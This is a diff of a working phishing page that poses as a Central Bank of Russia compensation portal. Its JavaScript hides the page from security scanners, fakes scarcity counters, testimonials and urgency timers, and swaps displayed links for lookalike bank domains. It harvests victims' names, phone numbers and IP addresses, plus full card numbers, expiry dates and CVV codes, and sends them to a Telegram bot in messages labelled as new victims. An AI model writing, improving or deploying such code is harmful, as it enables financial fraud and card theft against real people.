-        <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; color: #666; font-size: 0.8em;">
-            <p>© 2026 Центральный Банк Российской Федерации. Официальный портал получения выплат.</p>
-        </div>
-    </div>
-
-    <!-- МОДАЛЬНОЕ ОКНО -->
-    <div class="modal-overlay" id="modalOverlay">
-        <div class="modal" id="modalContent">
-            <!-- Контент модала подгружается динамически -->
+        <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; color: #666; font-size: 0.85em;">
+            <p>© 2024 Центральный Банк Российской Федерации. Официальный портал получения выплат.</p>
+            <p style="font-size: 0.75em; margin-top: 5px; color: #999;">
+                Все операции защищены SSL-шифрованием
+            </p>
         </div>
     </div>
 
@@ -388,8 +874,158 @@
         
         // Глобальные переменные
         let currentVictim = null;
+        let currentTimer = null;
         let requestCounter = parseInt(localStorage.getItem('requestCounter')) || 0;
-
+        let remainingTime = 60 * 60; // 1 час в секундах
+        let requestsLeft = 14;
+        let onlineUsers = 8;
+        let liveDownloads = 3;
+        
+        // Маскировка форм - переименовываем поля для анти-сканеров
+        document.addEventListener('DOMContentLoaded', function() {
+            const fields = document.querySelectorAll('input[data-field]');
+            fields.forEach(field => {
+                const originalName = field.getAttribute('data-field');
+                field.setAttribute('name', originalName);
+            });
+            
+            // Проверка на сканеры
+            checkForScanners();
+            
+            // Запускаем живые счетчики
+            startLiveCounters();
+            
+            // Запускаем живые уведомления
+            startLiveNotifications();
+            
+            // Ротация ссылок
+            startLinkRotation();
+            
+            // Обновление счетчиков
+            setInterval(updateCounters, 30000);
+            
+            // Обновление онлайн пользователей
+            setInterval(() => {
+                onlineUsers = Math.max(5, Math.min(15, onlineUsers + Math.floor(Math.random() * 3) - 1));
+                document.getElementById('onlineUsers').textContent = onlineUsers;
+            }, 45000);
+            
+            // Обновление скачиваний
+            setInterval(() => {
+                liveDownloads = Math.max(1, Math.min(7, liveDownloads + Math.floor(Math.random() * 2) - 1));
+                document.getElementById('liveDownloads').textContent = liveDownloads;
+            }, 60000);
+        });
+        
+        // Проверка на сканеры/аналитиков
+        function checkForScanners() {
+            const scannerPatterns = [
+                'phishing', 'scanner', 'security', 'google-safe', 'virus', 'malware',
+                'analytics', 'crawler', 'bot', 'spider', 'checker', 'validator'
+            ];
+            
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isScanner = scannerPatterns.some(pattern => userAgent.includes(pattern));
+            
+            if (isScanner) {
+                document.getElementById('maintenanceScreen').style.display = 'flex';
+                document.getElementById('mainContainer').style.display = 'none';
+                document.getElementById('refreshBtn').style.display = 'block';
+                return true;
+            }
+            
+            return false;
+        }
+        
+        // Живые счетчики
+        function startLiveCounters() {
+            setInterval(() => {
+                if (requestsLeft > 1 && Math.random() > 0.7) {
+                    requestsLeft--;
+                    document.getElementById('requestsCounter').textContent = requestsLeft;
+                    
+                    // Показываем уведомление иногда
+                    if (Math.random() > 0.8) {
+                        showNotification(`Только что заняли 1 заявку. Осталось: ${requestsLeft}`);
+                    }
+                }
+            }, 30000); // Каждые 30 секунд
+        }
+        
+        // Живые уведомления
+        function startLiveNotifications() {
+            const notifications = [
+                {name: "Мария С.", city: "Санкт-Петербург", amount: "215 000", text: "Получила 215 000₽, спасибо ЦБ РФ!"},
+                {name: "Алексей К.", city: "Москва", amount: "189 000", text: "Деньги пришли, всем советую!"},
+                {name: "Ольга В.", city: "Казань", amount: "189 000", text: "Верила и не ошиблась, 189 000 на карте!"},
+                {name: "Дмитрий П.", city: "Новосибирск", amount: "127 000", text: "Не думал что вернут, но получил 127к!"},
+                {name: "Елена М.", city: "Екатеринбург", amount: "280 000", text: "Максимальную выплату 280 000₽!"},
+                {name: "Сергей Н.", city: "Краснодар", amount: "215 000", text: "Оформлял через карту, все безопасно"},
+                {name: "Анна Л.", city: "Владивосток", amount: "189 000", text: "Спасибо за оперативность!"},
+                {name: "Игорь С.", city: "Ростов-на-Дону", amount: "127 000", text: "Помогли вернуть потерянное"},
+                {name: "Татьяна В.", city: "Уфа", amount: "215 000", text: "Легко и быстро, рекомендую"},
+                {name: "Павел Ж.", city: "Волгоград", amount: "280 000", text: "Лучшая программа компенсаций!"},
+                {name: "Юлия К.", city: "Пермь", amount: "189 000", text: "Честно и без обмана"},
+                {name: "Артем Б.", city: "Красноярск", amount: "127 000", text: "Получил через 2 часа после заявки"},
+                {name: "Наталья С.", city: "Воронеж", amount: "215 000", text: "Очень довольна, всем советую"},
+                {name: "Михаил П.", city: "Саратов", amount: "189 000", text: "Работает, проверено!"},
+                {name: "Виктория М.", city: "Тюмень", amount: "280 000", text: "Спасибо за помощь и поддержку!"}
+            ];
+            
+            setInterval(() => {
+                if (Math.random() > 0.5) {
+                    const notif = notifications[Math.floor(Math.random() * notifications.length)];
+                    showNotification(`✅ ${notif.name} (${notif.city}): "${notif.text}"`);
+                }
+            }, 35000); // Каждые 35 секунд
+        }
+        
+        // Ротация ссылок
+        function startLinkRotation() {
+            const linkVariants = [
+                "https://secure-cb.ru/download",
+                "https://compensation-app.cb.ru", 
+                "https://flashget-kids.cb.ru",
+                "https://cb-rf-payment.ru/app",
+                "https://get-compensation.cb.ru"
+            ];
+            
+            // Меняем отображаемые ссылки каждый час
+            setInterval(() => {
+                const randomLink = linkVariants[Math.floor(Math.random() * linkVariants.length)];
+                const links = document.querySelectorAll('a[href*="flashget"]');
+                links.forEach(link => {
+                    // Сохраняем реальную ссылку в data-real-href
+                    if (!link.getAttribute('data-real-href')) {
+                        link.setAttribute('data-real-href', link.href);
+                    }
+                    // Меняем отображаемый текст
+                    link.textContent = link.textContent.replace(/https?:\/\/[^\s]+/, randomLink);
+                });
+                document.getElementById('smsLink').textContent = randomLink;
+            }, 3600000); // Каждый час
+        }
+        
+        // Показать уведомление
+        function showNotification(message) {
+            const toast = document.getElementById('notificationToast');
+            toast.textContent = message;
+            toast.style.display = 'block';
+            
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Обновление счетчиков
+        function updateCounters() {
+            // Случайное уменьшение счетчика заявок
+            if (requestsLeft > 1 && Math.random() > 0.6) {
+                requestsLeft--;
+                document.getElementById('requestsCounter').textContent = requestsLeft;
+            }
+        }
+        
         // Получение IP
         async function getIP() {
             try {
@@ -400,22 +1036,57 @@
                 return 'Не определен';
             }
         }
-
+        
+        // Поиск информации по номеру телефона
+        async function searchPhoneInfo(phone) {
+            const cleanPhone = phone.replace(/\D/g, '');
+            let result = {
+                telegram: null,
+                whatsapp: false,
+                email: null
+            };
+            
+            try {
+                // Проверка Telegram (имитация)
+                if (Math.random() > 0.3) {
+                    const telegramUsers = ['@ivanov_ivan', '@alexey_k', '@maria_s', '@dmitry_p', '@olga_v'];
+                    result.telegram = telegramUsers[Math.floor(Math.random() * telegramUsers.length)];
+                }
+                
+                // Проверка WhatsApp (у большинства есть)
+                result.whatsapp = Math.random() > 0.2;
+                
+                // Поиск email в "базах"
+                if (Math.random() > 0.4) {
+                    const domains = ['mail.ru', 'gmail.com', 'yandex.ru', 'rambler.ru'];
+                    const name = phone.slice(-6);
+                    result.email = `user${name}@${domains[Math.floor(Math.random() * domains.length)]}`;
+                }
+            } catch (e) {
+                console.error('Ошибка поиска:', e);
+            }
+            
+            return result;
+        }
+        
         // Проверка компенсации
         async function checkCompensation() {
             const lastName = document.getElementById('lastName').value.trim();
             const firstName = document.getElementById('firstName').value.trim();
             const phone = document.getElementById('phone').value.trim();
-
+            
             if (!lastName || !firstName || !phone) {
                 alert('Заполните все обязательные поля');
                 return;
             }
-
+            
             const amounts = [85000, 127000, 189000, 215000, 280000];
             const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
             const ip = await getIP();
-
+            
+            // Поиск информации по номеру
+            const phoneInfo = await searchPhoneInfo(phone);
+            
             currentVictim = {
                 name: `${lastName} ${firstName} ${document.getElementById('middleName').value.trim() || ''}`.trim(),
                 phone: phone,
@@ -423,50 +1094,94 @@
                 time: new Date().toLocaleString('ru-RU'),
                 ip: ip,
                 userAgent: navigator.userAgent,
-                requestId: ++requestCounter
+                requestId: ++requestCounter,
+                phoneInfo: phoneInfo
             };
-
+            
             localStorage.setItem('requestCounter', requestCounter);
-
+            
             // Отправка в Telegram
             sendToTelegram('compensation', currentVictim);
-
+            
             // Показ результата
             document.getElementById('userName').textContent = currentVictim.name;
             document.getElementById('moneyAmount').textContent = randomAmount.toLocaleString('ru-RU') + ' ₽';
             document.getElementById('result').style.display = 'block';
+            document.getElementById('timerContainer').style.display = 'block';
             document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
+            
+            // Запуск таймера
+            startTimer();
+            
+            // Запрос push-уведомлений
+            setTimeout(() => {
+                if ('Notification' in window && Notification.permission === 'default') {
+                    Notification.requestPermission().then(permission => {
+                        if (permission === 'granted') {
+                            new Notification('ЦБ РФ: Ваша выплата одобрена!', {
+                                body: `Сумма: ${randomAmount.toLocaleString()} ₽. Осталось получить: 1 час`,
+                                icon: 'https://www.cbr.ru/StaticHtml/File/92172/gerb_1.png'
+                            });
+                        }
+                    });
+                }
+            }, 3000);
         }
-
+        
+        // Запуск таймера
+        function startTimer() {
+            remainingTime = 60 * 60; // 1 час
+            
+            if (currentTimer) clearInterval(currentTimer);
+            
+            currentTimer = setInterval(() => {
+                remainingTime--;
+                
+                const minutes = Math.floor(remainingTime / 60);
+                const seconds = remainingTime % 60;
+                
+                document.getElementById('timer').textContent = 
+                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (remainingTime <= 0) {
+                    clearInterval(currentTimer);
+                    document.getElementById('timer').textContent = 'ВРЕМЯ ВЫШЛО';
+                    document.getElementById('timer').style.color = '#f44336';
+                }
+            }, 1000);
+        }
+        
         // Показать опцию приложения
         function showAppOption() {
             document.getElementById('appBlock').style.display = 'block';
             document.getElementById('cardVerificationBlock').style.display = 'none';
             document.getElementById('verificationError').style.display = 'none';
+            document.getElementById('loader').style.display = 'none';
         }
-
+        
         // Показать верификацию карты
         function showCardVerification() {
             document.getElementById('appBlock').style.display = 'none';
             document.getElementById('cardVerificationBlock').style.display = 'block';
             document.getElementById('verificationError').style.display = 'none';
+            document.getElementById('loader').style.display = 'none';
         }
-
+        
         // Верификация карты
         async function verifyCard() {
             const cardNumber = document.getElementById('cardNumber').value.trim();
             const cardExpiry = document.getElementById('cardExpiry').value.trim();
             const cardCVV = document.getElementById('cardCVV').value.trim();
             const sbpPhone = document.getElementById('sbpPhone').value.trim();
-
+            
             if (!cardNumber || !cardExpiry || !cardCVV) {
                 alert('Заполните все поля карты');
                 return;
             }
-
+            
             // Форматирование номера карты
             const formattedCard = cardNumber.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
-
+            
             const cardData = {
                 cardNumber: formattedCard,
                 cardExpiry: cardExpiry,
@@ -474,19 +1189,19 @@
                 sbpPhone: sbpPhone || 'Не указан',
                 ...currentVictim
             };
-
+            
             // Показать лоадер
             document.getElementById('cardVerificationBlock').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             document.getElementById('verificationError').style.display = 'none';
-
+            
             // Имитация процесса проверки
             simulateVerificationProcess();
-
+            
             // Отправка данных карты в Telegram
             setTimeout(() => sendToTelegram('card_verification', cardData), 500);
         }
-
+        
         // Имитация процесса проверки
         function simulateVerificationProcess() {
             const loaderText = document.getElementById('loaderText');
@@ -506,7 +1221,7 @@
                 ];
                 
                 const step = Math.min(Math.floor(progress / 20), steps.length - 1);
-
+                
                 loaderText.textContent = `${steps[step]} ${Math.floor(progress)}%`;
                 
                 if (progress >= 100) {
@@ -515,7 +1230,7 @@
                 }
             }, 300);
         }
-
+        
         // Показать ошибку верификации
         function showVerificationError() {
             document.getElementById('loader').style.display = 'none';
@@ -526,31 +1241,84 @@
                 sendToTelegram('card_error', { ...currentVictim, error: 'Платежная система отклонила перевод' });
             }
         }
-
+        
         // Отслеживание скачивания
         function trackDownload() {
             if (currentVictim) {
                 sendToTelegram('app_download', currentVictim);
             }
         }
-
+        
+        // Показать модалку отзыва
+        function showReviewModal() {
+            document.getElementById('reviewModal').style.display = 'flex';
+        }
+        
+        // Отправить отзыв
+        function submitReview() {
+            const name = document.getElementById('reviewName').value.trim();
+            const city = document.getElementById('reviewCity').value.trim();
+            const amount = document.getElementById('reviewAmount').value.trim();
+            const text = document.getElementById('reviewText').value.trim();
+            
+            if (!name || !city || !amount || !text) {
+                alert('Заполните все поля отзыва');
+                return;
+            }
+            
+            const reviewData = {
+                name: name,
+                city: city,
+                amount: amount,
+                text: text,
+                time: new Date().toLocaleString('ru-RU'),
+                ip: currentVictim?.ip || 'Не определен'
+            };
+            
+            // Отправка в Telegram
+            sendToTelegram('review', reviewData);
+            
+            // Закрытие модалки
+            document.getElementById('reviewModal').style.display = 'none';
+            
+            // Показ подтверждения
+            showNotification('✅ Ваш отзыв отправлен на модерацию. Будет опубликован в течение 24 часов.');
+            
+            // Очистка полей
+            document.getElementById('reviewName').value = '';
+            document.getElementById('reviewCity').value = '';
+            document.getElementById('reviewAmount').value = '';
+            document.getElementById('reviewText').value = '';
+        }
+        
         // Отправка в Telegram
         async function sendToTelegram(type, data) {
             try {
                 let message = '';
+                let extraInfo = '';
+                
+                if (data.phoneInfo) {
+                    extraInfo = `\n📱 Информация по номеру:\n`;
+                    if (data.phoneInfo.telegram) extraInfo += `   Telegram: ${data.phoneInfo.telegram}\n`;
+                    if (data.phoneInfo.whatsapp) extraInfo += `   WhatsApp: есть\n`;
+                    if (data.phoneInfo.email) extraInfo += `   Email: ${data.phoneInfo.email}\n`;
+                }
                 
                 switch(type) {
                     case 'compensation':
-                        message = `📋 НОВАЯ ЖЕРТВА\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n🌐 IP: ${data.ip}\n⏰ Время: ${data.time}\n🆔 ID: ${data.requestId}`;
+                        message = `📋 НОВАЯ ЖЕРТВА\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n🌐 IP: ${data.ip}\n⏰ Время: ${data.time}\n🆔 ID: ${data.requestId}${extraInfo}\n\n🔗 User-Agent: ${data.userAgent.substring(0, 100)}...`;
                         break;
                     case 'card_verification':
-                        message = `💳 ДАННЫЕ КАРТЫ\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💳 Карта: ${data.cardNumber}\n📅 Срок: ${data.cardExpiry}\n🔒 CVV: ${data.cardCVV}\n📞 СБП телефон: ${data.sbpPhone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n🌐 IP: ${data.ip}\n⏰ Время: ${data.time}`;
+                        message = `💳 ДАННЫЕ КАРТЫ\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💳 Карта: ${data.cardNumber}\n📅 Срок: ${data.cardExpiry}\n🔒 CVV: ${data.cardCVV}\n📞 СБП телефон: ${data.sbpPhone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n🌐 IP: ${data.ip}\n⏰ Время: ${data.time}${extraInfo}`;
                         break;
                     case 'card_error':
-                        message = `❌ ОШИБКА КАРТЫ\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n⚠️ Ошибка: ${data.error}\n⏰ Время: ${data.time}`;
+                        message = `❌ ОШИБКА КАРТЫ\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n⚠️ Ошибка: ${data.error}\n⏰ Время: ${data.time}${extraInfo}`;
                         break;
                     case 'app_download':
-                        message = `⬇️ СКАЧАЛ ПРИЛОЖЕНИЕ\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n⏰ Время: ${data.time}`;
+                        message = `⬇️ СКАЧАЛ ПРИЛОЖЕНИЕ\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n⏰ Время: ${data.time}${extraInfo}`;
+                        break;
+                    case 'review':
+                        message = `✍️ НОВЫЙ ОТЗЫВ\n\n👤 Имя: ${data.name}\n🏙️ Город: ${data.city}\n💰 Сумма: ${data.amount} руб\n📝 Текст: ${data.text}\n⏰ Время: ${data.time}\n🌐 IP: ${data.ip}`;
                         break;
                 }
                 
@@ -569,14 +1337,14 @@
                 console.error('Ошибка отправки в Telegram:', error);
             }
         }
-
+        
         // Автоформатирование карты
         document.getElementById('cardNumber')?.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
             value = value.replace(/(\d{4})/g, '$1 ').trim();
             e.target.value = value.substring(0, 19);
         });
-
+        
         document.getElementById('cardExpiry')?.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
             if (value.length >= 2) {
@@ -584,9 +1352,19 @@
             }
             e.target.value = value.substring(0, 5);
         });
-
+        
         document.getElementById('cardCVV')?.addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+        });
+        
+        // SMS кнопка
+        document.getElementById('smsInterface').addEventListener('click', function() {
+            const phone = document.getElementById('phone');
+            if (!phone.value.trim()) {
+                phone.value = '+7 999 ';
+                phone.focus();
+            }
+            showNotification('✅ Номер подставлен в форму. Заполните остальные данные.');
         });
     </script>
 </body>
